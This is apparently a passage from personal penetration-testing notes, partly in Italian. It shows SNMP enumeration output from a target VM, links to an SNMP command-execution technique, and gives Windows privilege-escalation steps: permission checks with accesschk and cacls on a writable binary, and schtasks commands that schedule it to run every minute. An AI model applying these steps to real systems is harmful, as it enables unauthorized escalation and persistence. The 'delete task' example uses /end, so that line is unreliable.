  TCP segments retrans          : 746
  Input datagrams               : 154288
  Delivered datagrams           : 154288
  Output datagrams              : 150582

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:bf:d0:b7
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 17672196
  Out octets                    : 41539953

  Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:d0:b7
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  1                     127.0.0.1             255.0.0.0             0                   
  2                     192.168.199.42        255.255.255.0         1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               192.168.199.254       0.0.0.0               1                   
  192.168.199.0         0.0.0.0               255.255.255.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               25                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               139                   0.0.0.0               0                     listen              
  0.0.0.0               199                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               31337                 0.0.0.0               0                     listen              
  192.168.199.42        25                    192.168.49.199        34668                 established         

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               137                 
  0.0.0.0               138                 
  0.0.0.0               161                 
  192.168.199.42        137                 
  192.168.199.42        138                 

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              init                  init [2]                                  
  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
  3                     runnable              events/0              events/0                                  
  4                     runnable              khelper               khelper                                   
  5                     runnable              kacpid                kacpid                                    
  99                    runnable              kblockd/0             kblockd/0                                 
  109                   runnable              pdflush               pdflush                                   
  110                   runnable              pdflush               pdflush                                   
  111                   runnable              kswapd0               kswapd0                                   
  112                   runnable              aio/0                 aio/0                                     
  255                   runnable              kseriod               kseriod                                   
  276                   runnable              scsi_eh_0             scsi_eh_0                                 
  284                   runnable              khubd                 khubd                                     
  348                   runnable              shpchpd_event         shpchpd_event                             
  380                   runnable              kjournald             kjournald                                 
  935                   runnable              vmmemctl              vmmemctl                                  
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
  3773                  running               syslogd               /sbin/syslogd                             
  3776                  runnable              klogd                 /sbin/klogd                               
  3780                  runnable              clamd                 /usr/local/sbin/clamd                      
  3782                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3795                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
  3797                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3801                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3802                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3808                  runnable              sshd                  /usr/sbin/sshd                            
  3886                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
  3900                  runnable              atd                   /usr/sbin/atd                             
  3903                  runnable              cron                  /usr/sbin/cron                            
  3910                  runnable              apache                /usr/sbin/apache                          
  3911                  runnable              apache                /usr/sbin/apache                          
  3912                  runnable              apache                /usr/sbin/apache                          
  3913                  runnable              apache                /usr/sbin/apache                          
  3914                  runnable              apache                /usr/sbin/apache                          
  3915                  runnable              apache                /usr/sbin/apache                          
  3931                  runnable              getty                 /sbin/getty           38400 tty1          
  3937                  runnable              getty                 /sbin/getty           38400 tty2          
  3938                  runnable              getty                 /sbin/getty           38400 tty3          
  3939                  runnable              getty                 /sbin/getty           38400 tty4          
  3940                  runnable              getty                 /sbin/getty           38400 tty5          
  3941                  runnable              getty                 /sbin/getty           38400 tty6          
  4045                  runnable              apache                /usr/sbin/apache                          
  4053                  runnable              apache                /usr/sbin/apache                          
  4098                  runnable              apache                /usr/sbin/apache                          
  4120                  runnable              apache                /usr/sbin/apache                          
  4123                  runnable              apache                /usr/sbin/apache                          
  4907                  runnable              inetd                 /usr/sbin/inetd                           

[*] Storage information:

  Description                   : ["Real Memory"]
  Device id                     : [#<SNMP::Integer:0x000055adb62752e0 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61d75b8 @value=1024>]
  Memory size                   : 250.82 MB
  Memory used                   : 144.49 MB

  Description                   : ["Swap Space"]
  Device id                     : [#<SNMP::Integer:0x000055adb61d1ed8 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61cbfb0 @value=1024>]
  Memory size                   : 203.91 MB
  Memory used                   : 0 bytes

  Description                   : ["/"]
  Device id                     : [#<SNMP::Integer:0x000055adb6272b58 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb6270e70 @value=4096>]
  Memory size                   : 3.74 GB
  Memory used                   : 779.46 MB

  Description                   : ["/sys"]
  Device id                     : [#<SNMP::Integer:0x000055adb61bf968 @value=5>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055adb61bdc08 @value=4096>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes


[*] File system information:

  Index                         : 1
  Mount point                   : /
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 1

[*] Device information:

  Id                    Type                  Status                Descr               
  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7371 16-Core Processor
  1025                  unknown               running               network interface lo
  1026                  unknown               running               network interface eth0
  1027                  unknown               down                  network interface sit0
  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
  1552                  unknown               unknown               SCSI disk (/dev/sda)
  3072                  unknown               unknown               Guessing that there's a floating point co-processor
```


RCE:
https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/


### accesschk (Windows)
Lo trovi in **~/Download** da caricare sulla macchina

C:\Backup>accesschk.exe /accepteula -q -a TFTP.EXE_bck
accesschk.exe /accepteula -q -a TFTP.EXE_bck
C:\Backup\TFTP.EXE_bck
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW BUILTIN\Administrators
  RW NT AUTHORITY\SYSTEM
  RW NT AUTHORITY\Authenticated Users


### cacls (Windows)
Già su Windows

C:\Backup>cacls TFTP.EXE_bck
cacls TFTP.EXE_bck
C:\Backup\TFTP.EXE_bck BUILTIN\Users:(ID)F 
                       BUILTIN\Administrators:(ID)F 
                       NT AUTHORITY\SYSTEM:(ID)F 
                       NT AUTHORITY\Authenticated Users:(ID)C 


### schtasks (Windows Task Scheduler)

https://docs.microsoft.com/it-it/windows-server/administration/windows-commands/schtasks

Creare un task schedulato che esegue ogni minuto: ("tftp" è il nome che si sceglie per il task e "\Backup\TFTP.EXE" è il path dell'eseguibile e si deve mettere in quel modo)
```
schtasks /create /sc minute /mo 1 /tn "tftp" /tr \Backup\TFTP.EXE
```

Cercare un task schedulato per nome:
```
C:\Backup>schtasks /query /tn tftp2
schtasks /query /tn tftp2

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
tftp2                                    6/8/2021 11:09:00 AM   Ready     
```

Eliminare un task schedulato per nome:
```
schtasks /end /tn tftp2
```